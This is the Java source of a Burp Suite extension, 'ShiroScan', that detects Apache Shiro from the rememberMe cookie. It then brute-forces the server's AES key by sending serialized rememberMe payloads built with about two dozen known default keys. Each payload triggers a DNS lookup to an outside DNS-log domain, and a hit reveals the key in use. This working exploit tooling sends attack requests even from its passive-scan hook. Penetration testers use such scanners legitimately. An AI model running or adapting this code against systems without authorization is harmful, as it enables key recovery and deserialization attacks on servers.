package burp;

import java.awt.Component;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.locks.ReentrantLock;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.JTable;
import javax.swing.table.AbstractTableModel;

import com.core.DNSLog;
import com.core.GeneratePayload;

public class BurpExtender extends AbstractTableModel implements IBurpExtender, IMessageEditorController, ITab, IScannerCheck{
	IExtensionHelpers helpers;
	IBurpExtenderCallbacks callbacks;
	JSplitPane splitePane;
	List<LogEntry> log;
	IMessageEditor requestViewer;
	IMessageEditor responseViewer;
	Integer id;
	IHttpRequestResponse currentlyDisplayedItem;
	IHttpRequestResponse baseRequestResponse;
	ReentrantLock lock;
	PrintWriter stdout;
	
	
	public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks){
		this.callbacks=callbacks;
		this.callbacks.setExtensionName("ShiroScan");
		this.helpers=callbacks.getHelpers();
		this.stdout = new PrintWriter(callbacks.getStdout(), true);
		log=new ArrayList();
		lock=new ReentrantLock();
		this.splitePane=new JSplitPane(JSplitPane.VERTICAL_SPLIT);
		Table logTable=new Table(this);
		JScrollPane scrollPane=new JScrollPane(logTable);
		this.splitePane.setLeftComponent(scrollPane);
		JTabbedPane tabs=new JTabbedPane();
		this.requestViewer=callbacks.createMessageEditor(this,false);
		this.responseViewer=callbacks.createMessageEditor(this, false);
		tabs.add("Request",this.requestViewer.getComponent());
		tabs.add("Response",this.responseViewer.getComponent());
		this.splitePane.setRightComponent(tabs);
		callbacks.customizeUiComponent(this.splitePane);
		callbacks.customizeUiComponent(logTable);
		callbacks.customizeUiComponent(scrollPane);
		callbacks.customizeUiComponent(tabs);
		callbacks.addSuiteTab(this);
		callbacks.registerScannerCheck(this);
		this.id=0;
	}

	public int getRowCount() {
		try{
			return log.size();
		}catch(Exception e){
		}
		return 0;
	}

	public int getColumnCount() {

		return 3;
	}
	
	public String getColumnName(int index){
		if(index==0){
			return "id";
		}else if(index==1){
			return "url";
		}else{
			return "key";
		}
	}
	
	public Object getValueAt(int rowIndex, int columnIndex) {
		LogEntry logEntry=this.log.get(rowIndex);
		if(columnIndex==0){
			return String.valueOf(logEntry.id);
		}else if(columnIndex==1){
			return logEntry.url;
		}else if(columnIndex==2){
			return logEntry.key;
		}
		return null;
	}

	public IHttpService getHttpService() {
		return this.currentlyDisplayedItem.getHttpService();
	}

	public byte[] getRequest() {
		return this.currentlyDisplayedItem.getRequest();
	}

	public byte[] getResponse() {
		return this.currentlyDisplayedItem.getRequest();
	}

	public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
		this.baseRequestResponse=baseRequestResponse;
		String[] result=scanShiro(baseRequestResponse);
		if(result!=null&&result.length==2){
			lock.lock();
			this.id+=1;
			int row=log.size();
			String url=result[0];
			String key=result[1];
			this.log.add(new LogEntry(this.id, baseRequestResponse, url, key));
			this.fireTableRowsInserted(row,row);
			lock.unlock();
		}
		return null;
	}
	
	public String[] scanShiro(IHttpRequestResponse baseRequestResponse){
		HttpReqInfo reqInfo=new HttpReqInfo(baseRequestResponse);
		List<String> headers=reqInfo.headers;
		boolean isShiro=false;
		boolean hasCookie=false;
		boolean isHttps=false;
		int u=-1;
		for(int i=0;i<headers.size();i++){
			if(headers.get(i).indexOf("Cookie")!=-1){
				hasCookie=true;
				u=i;
				if(headers.get(i).indexOf("rememberMe")!=-1){
					headers.set(i, headers.get(i).replaceAll("rememberMe=", "rememberMe=123;"));
					isShiro=true;
					break;
				}else{
					headers.set(i, headers.get(i)+";rememberMe=123;");
					break;
				}
			}
		}
		if(hasCookie==false){
			headers.add("Cookie: rememberMe=123;");
			hasCookie=true;
			u=headers.size()-1;
		}
		if(isShiro==false){
//			stdout.println("success1");
//			stdout.println(headers);
			byte[] againReq=this.helpers.buildHttpMessage(headers,reqInfo.reqBody);
			if(reqInfo.protocol=="https"){
				isHttps=true;
			}
			byte[] againRes=this.callbacks.makeHttpRequest(reqInfo.host, reqInfo.port,isHttps,againReq);
			List<String> resHeaders=this.helpers.analyzeResponse(againRes).getHeaders();
//			stdout.println(resHeaders);
//			stdout.println("success2");
			for(String resHeader:resHeaders){
				if(resHeader.indexOf("rememberMe")!=-1){
					isShiro=true;
					break;
				}
			}
		}
		if(isShiro==true){
			String[] cipherkeys={"kPH+bIxk5D2deZiIxcaaaA==","2AvVhdsgUs0FSA3SDFAdag==","3AvVhmFLUs0KTA3Kprsdag==","4AvVhmFLUs0KTA3Kprsdag==","5aaC5qKm5oqA5pyvAAAAAA==","6ZmI6I2j5Y+R5aSn5ZOlAA==",
						"bWljcm9zAAAAAAAAAAAAAA==","wGiHplamyXlVB11UXWol8g==","Z3VucwAAAAAAAAAAAAAAAA==","MTIzNDU2Nzg5MGFiY2RlZg==","U3ByaW5nQmxhZGUAAAAAAA==","5AvVhmFLUs0KTA3Kprsdag==",
						"fCq+/xW488hMTCD+cmJ3aQ==","1QWLxg+NYmxraMoxAXu/Iw==","ZUdsaGJuSmxibVI2ZHc9PQ==","L7RioUULEFhRyxM7a2R/Yg==","r0e3c16IdVkouZgk1TKVMg==","bWluZS1hc3NldC1rZXk6QQ==",
						"a2VlcE9uR29pbmdBbmRGaQ==","WcfHGU25gNnTxTlmJMeSpw==","ZAvph3dsQs0FSL3SDFAdag==","tiVV6g3uZBGfgshesAQbjA==","cmVtZW1iZXJNZQAAAAAAAA==","ZnJlc2h6Y24xMjM0NTY3OA==",
						"RVZBTk5JR0hUTFlfV0FPVQ==","WkhBTkdYSUFPSEVJX0NBVA=="};
//			IBurpCollaboratorClientContext collaborator=this.callbacks.createBurpCollaboratorClientContext();
//			String val=collaborator.generatePayload(true);
			DNSLog dnsLog=new DNSLog();
			String val=null;
			try{
				val=dnsLog.getDomain2();
			}catch(Exception e){}
//			stdout.println(val);
			Map<String,String> map=new HashMap<String, String>();
			for(String key:cipherkeys){
				String uuid = UUID.randomUUID().toString().replaceAll("-","");
//				String payload=GeneratePayload.generate("http://cm2j3vbs13c4gi05rgrt922zuq0go5.burpcollaborator.net", key);
//				stdout.println(payload);
				String payload=GeneratePayload.generate("http://"+uuid+"."+val, key);
				headers.set(u, regReplace(headers.get(u), "rememberMe=.*;", "rememberMe="+payload+";"));
//				stdout.println(headers);
				map.put(uuid+"."+val, key);
				byte[] tmpReq=this.helpers.buildHttpMessage(headers, reqInfo.reqBody);
				if(reqInfo.protocol=="https"){
					isHttps=true;
				}
				byte[] tmpRes=this.callbacks.makeHttpRequest(reqInfo.host, reqInfo.port,isHttps,tmpReq);
//				stdout.println(tmpRes);
			}
			String dnsRes=null;
			try{
				Thread.sleep(5000);
				dnsRes=dnsLog.getRecode2();
			}catch(Exception e){}
			if(dnsRes==null)return null;
			for(Map.Entry<String, String> entry:map.entrySet()){
//				stdout.println("123");
//				stdout.println(entry.getKey());
//				List<IBurpCollaboratorInteraction> list=collaborator.fetchAllCollaboratorInteractions();
//				stdout.println(list);
				if(dnsRes.indexOf(entry.getKey())!=-1){
					stdout.println("find");
	
					return new String[]{reqInfo.url.toString(),entry.getValue()};
				}
			}
		}
//		stdout.println(reqInfo.headers);
		return null;
	}
	 public static String regReplace(String content,String pattern,String newString){
   	     Pattern p = Pattern.compile(pattern);
   	     Matcher m = p.matcher(content);
   	     String result = m.replaceAll(newString);
   	     return result;
   	 }
	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,
			IScannerInsertionPoint insertionPoint) {
		// TODO Auto-generated method stub
		return null;
	}

	public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
		// TODO Auto-generated method stub
		return 0;
	}

	public String getTabCaption() {
		return "ShiroScanner";
	}

	public Component getUiComponent() {
		return this.splitePane;
	}
	
	class HttpReqInfo{
		URL url;
		String protocol;
		byte[] reqBody;
		List<String> headers;
		IHttpService service;
		String host;
		int port;
		
		public HttpReqInfo(IHttpRequestResponse baseRequestResponse){
			this.service=baseRequestResponse.getHttpService();
			this.host=this.service.getHost();
			this.port=this.service.getPort();
			this.protocol=this.service.getProtocol();
			IRequestInfo ana=helpers.analyzeRequest(this.service, baseRequestResponse.getRequest());
			this.reqBody=Arrays.copyOfRange(baseRequestResponse.getRequest(),ana.getBodyOffset(),baseRequestResponse.getRequest().length);
			this.headers=ana.getHeaders();
			this.url=ana.getUrl();
		}
	}
}

class Table extends JTable{
	BurpExtender extender;
	public Table(BurpExtender extender){
		this.extender=extender;
		this.setModel(extender);
	}
	
	public void changeSelection(int row,int col,boolean toggle,boolean extend){
		LogEntry logEntry=this.extender.log.get(row);
		this.extender.requestViewer.setMessage(logEntry.requestResponse.getRequest(), true);
		this.extender.responseViewer.setMessage(logEntry.requestResponse.getResponse(), false);
		this.extender.currentlyDisplayedItem=logEntry.requestResponse;
		super.changeSelection(row,col,toggle,extend);
//		this.changeSelection(row,col,toggle,extend);
	}
}

class LogEntry{
	int id;
	IHttpRequestResponse requestResponse;
	String key;
	String url;
	public LogEntry(int record_id,IHttpRequestResponse requestResponse,String url,String key){
		this.id=record_id;
		this.requestResponse=requestResponse;
		this.url=url;
		this.key=key;
	}
}


